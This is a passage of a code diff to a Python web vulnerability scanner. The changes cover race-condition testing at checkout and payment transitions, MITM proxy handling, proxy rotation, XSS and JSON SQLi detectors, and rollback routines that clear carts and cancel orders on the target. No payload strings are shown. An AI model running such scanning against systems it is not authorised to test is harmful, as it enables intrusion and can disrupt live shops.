+        Args:
+            current_state: Current FSM state
+            
+        Returns:
+            Dictionary with injection point details
+        """
+        race_windows = self.get_race_condition_windows(current_state)
+        
+        if not race_windows:
+            return None
+        
+        # Select the highest-risk window
+        for window_name, window_details in race_windows.items():
+            if 'payment' in window_name.lower() or 'checkout' in window_name.lower():
+                return {
+                    'window': window_name,
+                    'timing': window_details['timing'][0],  # Use first timing
+                    'payloads': window_details['payloads'],
+                    'time_deltas': window_details.get('time_deltas', [0, 10, 50, 100]),
+                    'confidence': self.sequence_confidence.get(f"{current_state}->unknown", 0.5)
+                }
+        
+        # Fallback to first available window
+        first_window = next(iter(race_windows.values()))
+        first_window_name = next(iter(race_windows.keys()))
+        
+        return {
+            'window': first_window_name,
+            'timing': first_window['timing'][0],
+            'payloads': first_window['payloads'],
+            'time_deltas': first_window.get('time_deltas', [0, 10, 50, 100]),
+            'confidence': 0.5
+        }
+    
+    def should_test_race_condition(self, current_state, next_state=None):
+        """
+        Determine if race condition testing should be performed at this state transition.
+        
+        Args:
+            current_state: Current FSM state
+            next_state: Expected next state
+            
+        Returns:
+            Boolean indicating whether to test race conditions
+        """
+        # Always test at high-value transitions
+        high_value_transitions = [
+            'cart->checkout',
+            'checkout->payment', 
+            'payment->confirm',
+            'confirm->complete'
+        ]
+        
+        transition = f"{current_state}->{next_state}" if next_state else None
+        
+        if transition in high_value_transitions:
+            return True
+        
+        # Test based on current state risk
+        if current_state in ['payment', 'checkout', 'confirm']:
+            return True
+        
+        # Test based on learned sequence confidence
+        if transition and self.sequence_confidence.get(transition, 0) > 0.7:
+            return True
+        
+        return False
+    
+    def get_state_transition_context(self, from_state, to_state):
+        """
+        Get context information for a specific state transition.
+        
+        Args:
+            from_state: Source state
+            to_state: Destination state
+            
+        Returns:
+            Dictionary with transition context
+        """
+        transition_key = f"{from_state}->{to_state}"
+        transitions = self.learned_sequences.get(transition_key, [])
+        
+        if not transitions:
+            return {}
+        
+        # Aggregate context from multiple observations
+        context = {
+            'transition_count': len(transitions),
+            'avg_transition_time': 0,
+            'common_urls': [],
+            'common_actions': [],
+            'success_rate': 0
+        }
+        
+        # Calculate average transition time
+        times = []
+        for trans in transitions:
+            if 'timestamp' in trans:
+                times.append(trans['timestamp'])
+        
+        if times:
+            context['avg_transition_time'] = sum(times) / len(times)
+        
+        # Extract common patterns
+        urls = [t.get('context', {}).get('url') for t in transitions if t.get('context', {}).get('url')]
+        if urls:
+            from collections import Counter
+            url_counter = Counter(urls)
+            context['common_urls'] = [url for url, count in url_counter.most_common(3)]
+        
+        actions = [t.get('action') for t in transitions if t.get('action')]
+        if actions:
+            from collections import Counter
+            action_counter = Counter(actions)
+            context['common_actions'] = [action for action, count in action_counter.most_common(3)]
+        
+        return context
+    
+    def export_fsm_state(self):
+        """Export current FSM state for persistence or analysis"""
+        return {
+            'current_state': self.current_state,
+            'learned_sequences': dict(self.learned_sequences),
+            'sequence_confidence': dict(self.sequence_confidence),
+            'transition_history': self.transition_history,
+            'state_context': self.state_context,
+            'flow_templates': self.flow_templates
+        }
+    
+    def import_fsm_state(self, state_data):
+        """Import FSM state from previously exported data"""
+        self.current_state = state_data.get('current_state', 'initial')
+        self.learned_sequences = defaultdict(list, state_data.get('learned_sequences', {}))
+        self.sequence_confidence = defaultdict(float, state_data.get('sequence_confidence', {}))
+        self.transition_history = state_data.get('transition_history', [])
+        self.state_context = state_data.get('state_context', {})
+        self.flow_templates.update(state_data.get('flow_templates', {}))
+        
+        logging.info("FSM state imported successfully")
+
 class FP_Database:
-    def __init__(self, db_path="fp_learn.db", config=None):
+    def __init__(self, db_path=None, config=None):
         self.config = config or {}
+        # Use instance-specific database path to prevent conflicts with concurrent scans
+        if db_path is None:
+            import os
+            instance_id = uuid.uuid4().hex[:8]
+            db_path = f"fp_learn_{instance_id}.db"
         self.conn = sqlite3.connect(db_path, check_same_thread=False)
         self.c = self.conn.cursor()
         self.c.execute('''CREATE TABLE IF NOT EXISTS false_positives
@@ -12429,12 +15014,14 @@ class FP_Database:
         self.pending_inserts = []
         self.batch_size = 100
         
-        # Confidence decay on duplicates: Track vulnerability signatures
-        self.vulnerability_signatures = {}  # signature -> count
-        self.signature_lock = asyncio.Lock()
-        
         # Configuration for duplicate threshold
         fp_config = self.config.get('fp_handling', {})
+        
+        # Confidence decay on duplicates: Track vulnerability signatures with size limit
+        self.vulnerability_signatures = {}  # signature -> count
+        self.signature_lock = asyncio.Lock()
+        self.max_signatures = fp_config.get('max_vulnerability_signatures', 10000) if config else 10000
+        
         self.duplicate_threshold = fp_config.get('duplicate_threshold', 10)
         self.parameter_specific_suppression = fp_config.get('parameter_specific_suppression', True)
         self.context_specific_whitelist = fp_config.get('context_specific_whitelist', True)
@@ -12512,6 +15099,14 @@ class FP_Database:
                     'first_url': vuln['url'],
                     'original_confidence': vuln.get('confidence', 50)
                 }
+                
+                # Enforce size limit to prevent memory bloat
+                if len(self.vulnerability_signatures) > self.max_signatures:
+                    # Remove oldest entries (FIFO)
+                    keys_to_remove = list(self.vulnerability_signatures.keys())[:len(self.vulnerability_signatures) - self.max_signatures]
+                    for key in keys_to_remove:
+                        del self.vulnerability_signatures[key]
+                
                 return False, vuln.get('confidence', 50)
             else:
                 # Duplicate detected
@@ -12846,7 +15441,7 @@ class ProxyPool:
                     config.failure_count = 0
                     config.is_healthy = True
                     
-    async def health_check(self, proxy_config: ProxyConfig, timeout=10) -> bool:
+    async def health_check(self, proxy_config: ProxyConfig, timeout=DEFAULT_REQUEST_TIMEOUT) -> bool:
         """Check if a proxy is working by making a test request"""
         try:
             import aiohttp
@@ -13023,30 +15618,70 @@ class ProxyRotator:
         self.proxy_pool.reset_proxy_status()
 
 class ScanStateManager:
-    def __init__(self, db_path="scan_state.db"):
+    def __init__(self, db_path="scan_state.db", html_cache_dir="html_cache"):
         self.conn = sqlite3.connect(db_path, check_same_thread=False)
         self.c = self.conn.cursor()
         self._init_tables()
         self.lock = threading.Lock()
         self.pending_page_inserts = []
         self.batch_size = 100
+        self.html_cache_dir = html_cache_dir
+        os.makedirs(self.html_cache_dir, exist_ok=True)
     def _init_tables(self):
         self.c.execute('''CREATE TABLE IF NOT EXISTS scan_state
              (id INTEGER PRIMARY KEY, target TEXT, timestamp TEXT, 
               visited_urls TEXT, parameters TEXT, vulnerabilities TEXT,
               crawled_pages TEXT, config TEXT)''')
         self.c.execute('''CREATE TABLE IF NOT EXISTS page_hashes
-             (url TEXT PRIMARY KEY, content_hash TEXT, metadata TEXT, html_content TEXT, timestamp TEXT)''')
+             (url TEXT PRIMARY KEY, content_hash TEXT, metadata TEXT, html_path TEXT, timestamp TEXT)''')
+        # Migration: if old html_content column exists, migrate to html_path
         try:
-            self.c.execute("ALTER TABLE page_hashes ADD COLUMN html_content TEXT")
+            self.c.execute("SELECT html_content FROM page_hashes LIMIT 1")
+            # Column exists, migrate existing data
+            self.c.execute("SELECT url, html_content FROM page_hashes WHERE html_content IS NOT NULL AND html_content != ''")
+            rows = self.c.fetchall()
+            for url, html_content in rows:
+                if html_content:
+                    html_path = self._save_html_to_disk(url, html_content)
+                    self.c.execute("UPDATE page_hashes SET html_path = ?, html_content = NULL WHERE url = ?", (html_path, url))
+            # Remove old column
+            self.c.execute("ALTER TABLE page_hashes DROP COLUMN html_content")
         except sqlite3.OperationalError:
+            # Column doesn't exist, already migrated
             pass
         self.conn.commit()
+    
+    def _save_html_to_disk(self, url, html_content):
+        """Save HTML content to disk and return the file path"""
+        html_filename = hashlib.md5(url.encode()).hexdigest() + ".html"
+        html_path = os.path.join(self.html_cache_dir, html_filename)
+        with open(html_path, 'w', encoding='utf-8') as f:
+            f.write(html_content)
+        return html_path
+    
+    def _load_html_from_disk(self, html_path):
+        """Load HTML content from disk"""
+        try:
+            with open(html_path, 'r', encoding='utf-8') as f:
+                return f.read()
+        except (FileNotFoundError, IOError):
+            return None
     def save_state(self, target, visited_urls, parameters, vulnerabilities, crawled_pages, config):
         with self.lock:
             timestamp = datetime.now().isoformat()
+            # Store only metadata (URL and hash) instead of full HTML
+            crawled_pages_metadata = []
+            for p in crawled_pages:
+                page_meta = {'url': p['url']}
+                if 'hash' in p:
+                    page_meta['hash'] = p['hash']
+                elif 'html_path' in p:
+                    # Generate hash from file path if needed
+                    page_meta['hash'] = hashlib.md5(p['html_path'].encode()).hexdigest()
+                crawled_pages_metadata.append(page_meta)
+            
             self.c.execute("INSERT OR REPLACE INTO scan_state (id, target, timestamp, visited_urls, parameters, vulnerabilities, crawled_pages, config) VALUES (1, ?, ?, ?, ?, ?, ?, ?)",
-                          (target, json.dumps(list(visited_urls)), json.dumps(parameters), json.dumps(vulnerabilities), json.dumps([{'url': p['url'], 'hash': hashlib.md5(p['html'].encode()).hexdigest()} for p in crawled_pages]), json.dumps(config)))
+                          (target, json.dumps(list(visited_urls)), json.dumps(parameters), json.dumps(vulnerabilities), json.dumps(crawled_pages_metadata), json.dumps(config)))
             self.conn.commit()
     def load_state(self):
         with self.lock:
@@ -13085,30 +15720,82 @@ class ScanStateManager:
     def store_page_hash(self, url, content, metadata):
         with self.lock:
             content_hash = hashlib.sha256(content.encode()).hexdigest()
-            self.pending_page_inserts.append((url, content_hash, json.dumps(metadata), content, datetime.now().isoformat()))
+            html_path = self._save_html_to_disk(url, content)
+            self.pending_page_inserts.append((url, content_hash, json.dumps(metadata), html_path, datetime.now().isoformat()))
             if len(self.pending_page_inserts) >= self.batch_size:
                 self._flush_page_batch()
     def _flush_page_batch(self):
         if self.pending_page_inserts:
-            self.c.executemany("INSERT OR REPLACE INTO page_hashes (url, content_hash, metadata, html_content, timestamp) VALUES (?, ?, ?, ?, ?)", self.pending_page_inserts)
+            self.c.executemany("INSERT OR REPLACE INTO page_hashes (url, content_hash, metadata, html_path, timestamp) VALUES (?, ?, ?, ?, ?)", self.pending_page_inserts)
             self.conn.commit()
             self.pending_page_inserts.clear()
     def get_page_hash(self, url):
         with self.lock:
             self._flush_page_batch()
-            self.c.execute("SELECT content_hash, metadata, html_content FROM page_hashes WHERE url=?", (url,))
+            self.c.execute("SELECT content_hash, metadata, html_path FROM page_hashes WHERE url=?", (url,))
             row = self.c.fetchone()
             if row:
                 try:
                     metadata = json.loads(row[1])
                 except json.JSONDecodeError:
                     metadata = {}
-                return {'hash': row[0], 'metadata': metadata, 'html_content': row[2]}
+                html_content = self._load_html_from_disk(row[2]) if row[2] else None
+                return {'hash': row[0], 'metadata': metadata, 'html_content': html_content, 'html_path': row[2]}
+            return None
+    
+    def get_html_content(self, url):
+        """Get HTML content for a specific URL, loading from disk if needed"""
+        with self.lock:
+            self._flush_page_batch()
+            self.c.execute("SELECT html_path FROM page_hashes WHERE url=?", (url,))
+            row = self.c.fetchone()
+            if row and row[0]:
+                return self._load_html_from_disk(row[0])
             return None
     def clear_state(self):
         with self.lock:
             self.c.execute("DELETE FROM scan_state")
+            self.c.execute("DELETE FROM page_hashes")
             self.conn.commit()
+            # Clean up HTML cache directory
+            try:
+                import shutil
+                if os.path.exists(self.html_cache_dir):
+                    shutil.rmtree(self.html_cache_dir)
+                    os.makedirs(self.html_cache_dir, exist_ok=True)
+            except Exception as e:
+                logging.warning(f"Error clearing HTML cache directory: {e}")
+    
+    def find_most_recent_checkpoint(self):
+        """Find the most recent checkpoint file in the current directory"""
+        import glob
+        checkpoint_files = glob.glob("checkpoint_*.json")
+        if not checkpoint_files:
+            return None
+        
+        # Sort by timestamp (extracted from filename)
+        checkpoint_files.sort(key=lambda x: int(x.split('_')[1].split('.')[0]), reverse=True)
+        return checkpoint_files[0] if checkpoint_files else None
+    
+    def load_checkpoint_file(self, checkpoint_file):
+        """Load checkpoint from a specific file"""
+        try:
+            with open(checkpoint_file, 'r') as f:
+                checkpoint = json.load(f)
+            return checkpoint
+        except Exception as e:
+            logging.warning(f"Failed to load checkpoint from {checkpoint_file}: {e}")
+            return None
+    
+    def close(self):
+        """Close the database connection to prevent resource leaks."""
+        try:
+            if self.c:
+                self.c.close()
+            if self.conn:
+                self.conn.close()
+        except Exception as e:
+            logging.warning(f"Error closing ScanStateManager: {e}")
 
 class MITMProxyHandler:
     def __init__(self, port=8080, callback=None):
@@ -13189,9 +15876,16 @@ class MITMProxyHandler:
         return handler_class
     def stop(self):
         if self.server:
-            self.server.shutdown()
+            try:
+                self.server.shutdown()
+                logging.info("MITM proxy server stopped")
+            except Exception as e:
+                logging.warning(f"Error stopping MITM proxy server: {e}")
         if self.thread:
-            self.thread.join(timeout=2)
+            try:
+                self.thread.join(timeout=2)
+            except Exception as e:
+                logging.warning(f"Error joining MITM proxy thread: {e}")
     def get_captured_requests(self):
         with self.lock:
             return list(self.captured_requests)
@@ -13528,12 +16222,12 @@ class ValidationEngine:
             headers = vuln.get('request_headers', {})
             if method == 'GET':
                 params = {parameter: payload} if parameter else {}
-                async with self.session.get(url, params=params, headers=headers, timeout=10) as resp:
+                async with self.session.get(url, params=params, headers=headers, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                     html = await resp.text(errors='replace')
                     status = resp.status
             else:
                 data = {parameter: payload} if parameter else {}
-                async with self.session.post(url, data=data, headers=headers, timeout=10) as resp:
+                async with self.session.post(url, data=data, headers=headers, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                     html = await resp.text(errors='replace')
                     status = resp.status
             vuln_type = vuln.get('type', '')
@@ -13585,12 +16279,12 @@ class ValidationEngine:
                 headers = vuln.get('request_headers', {})
                 if method == 'GET':
                     params = {parameter: alt_payload} if parameter else {}
-                    async with self.session.get(url, params=params, headers=headers, timeout=10) as resp:
+                    async with self.session.get(url, params=params, headers=headers, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                         html = await resp.text()
                         status = resp.status
                 else:
                     data = {parameter: alt_payload} if parameter else {}
-                    async with self.session.post(url, data=data, headers=headers, timeout=10) as resp:
+                    async with self.session.post(url, data=data, headers=headers, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                         html = await resp.text()
                         status = resp.status
                 if 'XSS' in vuln_type:
@@ -13665,15 +16359,15 @@ class ValidationEngine:
                 headers = vuln.get('request_headers', {})
                 if method == 'GET':
                     params = {parameter: oob_payload} if parameter else {}
-                    async with self.session.get(url, params=params, headers=headers, timeout=10) as resp:
+                    async with self.session.get(url, params=params, headers=headers, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                         await resp.text()
                 else:
                     data = {parameter: oob_payload} if parameter else {}
-                    async with self.session.post(url, data=data, headers=headers, timeout=10) as resp:
+                    async with self.session.post(url, data=data, headers=headers, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                         await resp.text()
                 
                 # Check for actual callbacks
-                callback_received, callbacks = await self.oob_monitor.check_oob_callback(self.current_oob_bin, timeout=5)
+                callback_received, callbacks = await self.oob_monitor.check_oob_callback(self.current_oob_bin, timeout=DEFAULT_HEALTH_CHECK_TIMEOUT)
                 
                 return {
                     'passed': callback_received,
@@ -13693,15 +16387,15 @@ class ValidationEngine:
                 headers = vuln.get('request_headers', {})
                 if method == 'GET':
                     params = {parameter: oob_payload} if parameter else {}
-                    async with self.session.get(url, params=params, headers=headers, timeout=15.0) as resp:
+                    async with self.session.get(url, params=params, headers=headers, timeout=EXTENDED_REQUEST_TIMEOUT) as resp:
                         await resp.text()
                 else:
                     data = {parameter: oob_payload} if parameter else {}
-                    async with self.session.post(url, data=data, headers=headers, timeout=15.0) as resp:
+                    async with self.session.post(url, data=data, headers=headers, timeout=EXTENDED_REQUEST_TIMEOUT) as resp:
                         await resp.text()
                 
                 # Check for actual callbacks
-                callback_received, callbacks = await self.oob_monitor.check_oob_callback(self.current_oob_bin, timeout=10)
+                callback_received, callbacks = await self.oob_monitor.check_oob_callback(self.current_oob_bin, timeout=DEFAULT_REQUEST_TIMEOUT)
                 
                 return {
                     'passed': callback_received,
@@ -13727,12 +16421,12 @@ class ValidationEngine:
                     headers = vuln.get('request_headers', {})
                     if method == 'GET':
                         params = {parameter: csp_payload} if parameter else {}
-                        async with self.session.get(url, params=params, headers=headers, timeout=10) as resp:
+                        async with self.session.get(url, params=params, headers=headers, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                             html = await resp.text()
                             status = resp.status
                     else:
                         data = {parameter: csp_payload} if parameter else {}
-                        async with self.session.post(url, data=data, headers=headers, timeout=10) as resp:
+                        async with self.session.post(url, data=data, headers=headers, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                             html = await resp.text()
                             status = resp.status
                     if 'data:' in html or 'javascript:' in html:
@@ -13753,7 +16447,7 @@ class ValidationEngine:
                     headers = vuln.get('request_headers', {})
                     if method == 'GET':
                         params = {parameter: stacked_payload} if parameter else {}
-                        async with self.session.get(url, params=params, headers=headers, timeout=15.0) as resp:
+                        async with self.session.get(url, params=params, headers=headers, timeout=EXTENDED_REQUEST_TIMEOUT) as resp:
                             html = await resp.text()
                             status = resp.status
                     else:
@@ -13892,7 +16586,7 @@ class ValidationEngine:
             if 'race' in vuln_type.lower() or 'concurrency' in vuln_type.lower():
                 status_url = url.replace('/purchase', '/cart/status').replace('/buy', '/cart/status')
                 try:
-                    async with self.session.get(status_url, timeout=5) as resp:
+                    async with self.session.get(status_url, timeout=DEFAULT_HEALTH_CHECK_TIMEOUT) as resp:
                         if resp.status == 200:
                             data = await resp.json() if 'application/json' in resp.headers.get('content-type', '') else {}
                             # Check if we have stock/balance to test safely
@@ -13911,7 +16605,7 @@ class ValidationEngine:
     async def _save_rollback_state(self, url, parameter):
         """Save current state for potential rollback"""
         try:
-            async with self.session.get(url, timeout=10) as resp:
+            async with self.session.get(url, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                 original_data = await resp.text()
                 self.rollback_state[f"{url}_{parameter}"] = {
                     'original_data': original_data,
@@ -13988,7 +16682,7 @@ class ValidationEngine:
                 # Attempt to clear cart
                 clear_url = f"{url.rsplit('/', 1)[0]}/{cart_id}/clear"
                 try:
-                    async with self.session.post(clear_url, timeout=10) as resp:
+                    async with self.session.post(clear_url, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                         if resp.status in [200, 204]:
                             logging.info(f"Cleared cart {cart_id}")
                 except:
@@ -13999,7 +16693,7 @@ class ValidationEngine:
                     restore_data = json.loads(original_state['original_data'])
                     restore_url = f"{url.rsplit('/', 1)[0]}/{cart_id}/restore"
                     try:
-                        async with self.session.post(restore_url, json=restore_data, timeout=10) as resp:
+                        async with self.session.post(restore_url, json=restore_data, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                             return resp.status in [200, 201]
                     except:
                         pass
@@ -14023,7 +16717,7 @@ class ValidationEngine:
                 if user_id:
                     restore_url = f"{url.rsplit('/', 1)[0]}/{user_id}"
                     try:
-                        async with self.session.put(restore_url, json=original_data, timeout=10) as resp:
+                        async with self.session.put(restore_url, json=original_data, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                             return resp.status in [200, 201]
                     except:
                         pass
@@ -14043,7 +16737,7 @@ class ValidationEngine:
             if order_id:
                 cancel_url = f"{url.rsplit('/', 1)[0]}/{order_id}/cancel"
                 try:
-                    async with self.session.post(cancel_url, timeout=10) as resp:
+                    async with self.session.post(cancel_url, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                         if resp.status in [200, 204]:
                             logging.info(f"Cancelled test order {order_id}")
                             return True
@@ -14067,7 +16761,7 @@ class ValidationEngine:
                 
                 restore_url = f"{url.rsplit('/', 1)[0]}/{product_id}/inventory"
                 try:
-                    async with self.session.put(restore_url, json=original_data, timeout=10) as resp:
+                    async with self.session.put(restore_url, json=original_data, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                         return resp.status in [200, 201]
                 except:
                     pass
@@ -14087,7 +16781,7 @@ class ValidationEngine:
                 
                 # Try PUT method first
                 try:
-                    async with self.session.put(url, data=original_data, timeout=10) as resp:
+                    async with self.session.put(url, data=original_data, timeout=DEFAULT_REQUEST_TIMEOUT) as resp:
                         if resp.status in [200, 201, 204]:
                             return True
                 except:
@@ -14394,9 +17088,10 @@ class SurgicalModeOrchestrator:
     5. Output - Verified findings + gray zone leads
     """
     
-    def __init__(self, validation_engine, config=None):
+    def __init__(self, validation_engine, config=None, scanner=None):
         self.validation_engine = validation_engine
         self.config = config or {}
+        self.scanner = scanner
         
         # Surgical Mode Configuration
         self.critical_vulnerability_types = {'RCE', 'SQLi', 'Auth Bypass', 'IDOR', 'SSRF'}
@@ -14476,6 +17171,10 @@ class SurgicalModeOrchestrator:
         }
         
         logging.info(f"Surgical Mode completed: {len(final_results['verified_findings'])} verified, {len(final_results['gray_zone_findings'])} gray zone")
+        
+        # Push all verified findings to reporting pipeline for GUI display and export
+        self._push_verified_findings_to_reporting(final_results)
+        
         return final_results
     
     def _deduplicate_findings(self, findings):
@@ -14895,6 +17594,50 @@ class SurgicalModeOrchestrator:
             return round(efficiency_gain, 1)
         
         return 0
+    
+    def _push_verified_findings_to_reporting(self, final_results):
+        """Push all verified findings through the reporting pipeline for GUI display and export"""
+        if not self.scanner or not hasattr(self.scanner, 'reporting_engine'):
+            logging.warning("Cannot push findings to reporting - scanner or reporting_engine not available")
+            return
+        
+        verified_findings = final_results.get('verified_findings', [])
+        gray_zone_findings = final_results.get('gray_zone_findings', [])
+        
+        # Push verified findings
+        for finding in verified_findings:
+            try:
+                # Add to reporting engine vulnerabilities list
+                self.scanner.reporting_engine.vulnerabilities.append(finding)
+                
+                # Emit finding signal for GUI display
+                if hasattr(self.scanner.reporting_engine, 'add_finding'):
+                    self.scanner.reporting_engine.add_finding(finding)
+                
+                logging.info(f"Verified finding pushed to reporting: {finding.get('type')} at {finding.get('url')}")
+            except Exception as e:
+                logging.error(f"Failed to push verified finding to reporting: {e}")
+        
+        # Push gray zone findings (they're already handled by _add_gray_zone_to_reporting but ensure consistency)
+        for finding in gray_zone_findings:
+            try:
+                # Check if this is a gray zone entry dict or a finding dict
+                if isinstance(finding, dict) and 'vulnerability' in finding:
+                    # Already processed by _add_gray_zone_to_reporting
+                    continue
+                
+                # Add to reporting engine vulnerabilities list
+                self.scanner.reporting_engine.vulnerabilities.append(finding)
+                
+                # Emit finding signal for GUI display
+                if hasattr(self.scanner.reporting_engine, 'add_finding'):
+                    self.scanner.reporting_engine.add_finding(finding)
+                
+                logging.info(f"Gray zone finding pushed to reporting: {finding.get('type')} at {finding.get('url')}")
+            except Exception as e:
+                logging.error(f"Failed to push gray zone finding to reporting: {e}")
+        
+        logging.info(f"Pushed {len(verified_findings)} verified and {len(gray_zone_findings)} gray zone findings to reporting pipeline")
 
 
 # ---------------------------------------------------------------------
@@ -14964,21 +17707,40 @@ class Detector:
         """
         Check if payload resides inside a text() node using HTML5 parser and XPath.
         If payload is exclusively inside @value or @data-*, return False (drop finding).
+        Prioritize event-handler attributes over value attributes to avoid false negatives.
         """
         try:
             tree = html5lib.parse(html, treebuilder="etree", namespaceHTMLElements=False)
             from lxml import etree
             
+            # Event handler attributes that can execute JavaScript (dangerous)
+            event_handlers = {'onerror', 'onclick', 'onload', 'onmouseover', 'onmouseout', 
+                            'onfocus', 'onblur', 'onsubmit', 'onchange', 'ondblclick',
+                            'onkeydown', 'onkeyup', 'onkeypress', 'onmousedown', 'onmouseup',
+                            'onmouseenter', 'onmouseleave', 'oncontextmenu', 'onanimationend',
+                            'onanimationiteration', 'onanimationstart', 'ontransitionend',
+                            'oncopy', 'oncut', 'onpaste', 'onbeforeinput', 'oninput',
+                            'onreset', 'onscroll', 'onwheel', 'ontoggle', 'onpointerdown',
+                            'onpointerup', 'onpointermove', 'onpointercancel', 'ongotpointercapture',
+                            'onlostpointercapture', 'onpointerenter', 'onpointerleave'}
+            
+            # Check if payload is in attribute values
+            attr_nodes = tree.xpath("//*[@*[contains(., $payload)]]", payload=payload)
+            if attr_nodes:
+                # Check if it's in event handler attributes (HIGH PRIORITY - dangerous)
+                for elem in attr_nodes:
+                    for attr_name, attr_value in elem.attrib.items():
+                        if payload in attr_value and attr_name.lower() in event_handlers:
+                            return True  # Payload in event handler - valid XSS
+            
             # Check if payload is in text nodes (good - potential XSS)
             text_nodes = tree.xpath("//text()[contains(., $payload)]", payload=payload)
             if text_nodes:
                 # Verify it's not just in attribute values
-                attr_nodes = tree.xpath("//*[@*[contains(., $payload)]]", payload=payload)
                 if not attr_nodes:
                     return True  # Only in text nodes - valid XSS
             
             # Check if payload is in attribute values (bad - self-XSS or benign)
-            attr_nodes = tree.xpath("//*[@*[contains(., $payload)]]", payload=payload)
             if attr_nodes:
                 # Check if it's in safe attributes
                 for elem in attr_nodes:
@@ -15027,7 +17789,21 @@ class Detector:
     
     @staticmethod
     def xss(html, payload, baseline_html=None):
-        if payload not in html: return None
+        import html as html_module
+        
+        # Decode HTML entities to catch encoded payloads (e.g., &lt;script&gt;)
+        try:
+            decoded_html = html_module.unescape(html)
+        except Exception:
+            decoded_html = html
+        
+        # Check both original and decoded HTML for payload
+        if payload not in html and payload not in decoded_html: 
+            return None
+        
+        # Use decoded HTML for further processing if payload was found there
+        if payload in decoded_html and payload not in html:
+            html = decoded_html
         
         # 5.2 Improved SPA & Self-XSS Filtering with HTML5 parser and XPath
         # Check if payload resides inside a text() node using XPath
@@ -15116,7 +17892,7 @@ class Detector:
         """
         driver.execute_js(script)
         # Use persistent callback waiting for DOM XSS OOB detection
-        callback_result = wait_for_oob_callback(oob_marker, timeout_seconds=30, check_interval=0.5)
+        callback_result = await wait_for_oob_callback_async(oob_marker, timeout_seconds=30, check_interval=0.5)
         if callback_result:
             # OOB callback is critical evidence - very high confidence
             confidence = calculate_evidence_based_confidence(
@@ -15171,7 +17947,7 @@ class Detector:
                 found_elsewhere = False
                 
                 try:
-                    soup = BeautifulSoup(dom_content, 'html.parser')
+                    soup = get_cached_soup(dom_content, 'html.parser')
                     for elem in soup.find_all():
                         # Check value attributes
                         if elem.get('value') and payload.lower() in elem.get('value').lower():
@@ -15589,7 +18365,17 @@ class Detector:
     @staticmethod
     def blind_xss(oob_results, marker):
         # Use persistent callback waiting instead of single check
-        callback_result = wait_for_oob_callback(marker, timeout_seconds=30, check_interval=0.5)
+        # Run async callback wait in event loop since this is called from sync context
+        try:
+            loop = asyncio.get_event_loop()
+            if loop.is_running():
+                # If called from async context, this shouldn't happen but handle gracefully
+                callback_result = wait_for_oob_callback(marker, timeout_seconds=30, check_interval=0.5)
+            else:
+                callback_result = loop.run_until_complete(wait_for_oob_callback_async(marker, timeout_seconds=30, check_interval=0.5))
+        except RuntimeError:
+            # No event loop, use synchronous version
+            callback_result = wait_for_oob_callback(marker, timeout_seconds=30, check_interval=0.5)
         if callback_result:
             # OOB callback is critical evidence - very high confidence
             confidence = calculate_evidence_based_confidence(
@@ -15665,10 +18451,12 @@ class Detector:
     @staticmethod
     def sqli_json_aware(response_body: str, content_type: str = None) -> Optional[Dict[str, Any]]:
         """
-        JSON-aware SQLi detection - parse JSON responses and scan string values for SQL error patterns.
+        JSON-aware SQLi detection - parse JSON responses and scan string and numeric values for SQL error patterns.
         
         This method specifically handles JSON API responses where SQL errors might be embedded
-        in JSON fields rather than in HTML error pages.
+        in JSON fields rather than in HTML error pages. It now also checks numeric fields for:
+        - Integer overflow patterns (e.g., -2147483648)
+        - Database error codes (Oracle: -0xxx to -2xxxx, MySQL: 1000-3000)
         """
         # Check if response is JSON
         if content_type and not content_type.startswith('application/json'):
@@ -15707,6 +18495,53 @@ class Detector:
                         'value': obj[:200],  # Truncate long values
                         'full_length': len(obj)
                     })
+            elif isinstance(obj, (int, float)):
+                # Check numeric values for SQL error patterns
+                # Convert to string for pattern matching
+                num_str = str(obj)
+                # Check for integer overflow patterns (e.g., -2147483648)
+                if num_str == '-2147483648' or num_str == '2147483647' or num_str == '-2147483648.0':
+                    sql_errors_found.append({
+                        'path': path,
+                        'value': num_str,
+                        'full_length': len(num_str),
+                        'type': 'numeric_overflow'
+                    })
+                # Check for SQL error codes in numeric fields
+                # Oracle error codes are typically negative numbers like -0900, -12154
+                # MySQL error codes are typically positive numbers like 1064, 1054
+                # Only flag if it's in a specific range that looks like a database error code
+                try:
+                    # Convert to integer, handling both int and float
+                    if isinstance(obj, float):
+                        # Only consider if it's effectively an integer (e.g., -12154.0)
+                        if obj == int(obj):
+                            error_num = int(obj)
+                        else:
+                            # Skip floating point numbers that aren't integers
+                            error_num = None
+                    else:
+                        error_num = obj
+                    
+                    if error_num is not None:
+                        # Check for Oracle error codes (typically -900 to -30000)
+                        if -30000 <= error_num <= -900:
+                            sql_errors_found.append({
+                                'path': path,
+                                'value': num_str,
+                                'full_length': len(num_str),
+                                'type': 'numeric_error_code'
+                            })
+                        # Check for MySQL error codes (typically 1000-3000)
+                        elif 1000 <= error_num <= 3000:
+                            sql_errors_found.append({
+                                'path': path,
+                                'value': num_str,
+                                'full_length': len(num_str),
+                                'type': 'numeric_error_code'
+                            })
+                except (ValueError, TypeError):
+                    pass
         
         scan_json_for_sql_errors(json_data)
         
@@ -15714,7 +18549,13 @@ class Detector:
             # Build evidence from found errors
             evidence_details = []
             for error in sql_errors_found:
-                evidence_details.append(f"JSON path '{error['path']}': {error['value']}")
+                error_type = error.get('type', 'string')
+                if error_type == 'numeric_overflow':
+                    evidence_details.append(f"JSON path '{error['path']}': numeric overflow indicator {error['value']}")
+                elif error_type == 'numeric_error_code':
+                    evidence_details.append(f"JSON path '{error['path']}': error code {error['value']}")
+                else:
+                    evidence_details.append(f"JSON path '{error['path']}': {error['value']}")
             
             evidence = f"SQL error patterns detected in JSON response: {'; '.join(evidence_details)}"
             
@@ -16151,6 +18992,7 @@ class Detector:
         JSON Schema Normalizer: Recursively traverses JSON, strips keys matching 
         dynamic token regex (_at, _id, exp, nonce), then compares structural hash.
         Only flags if structural differences exist beyond timestamps.
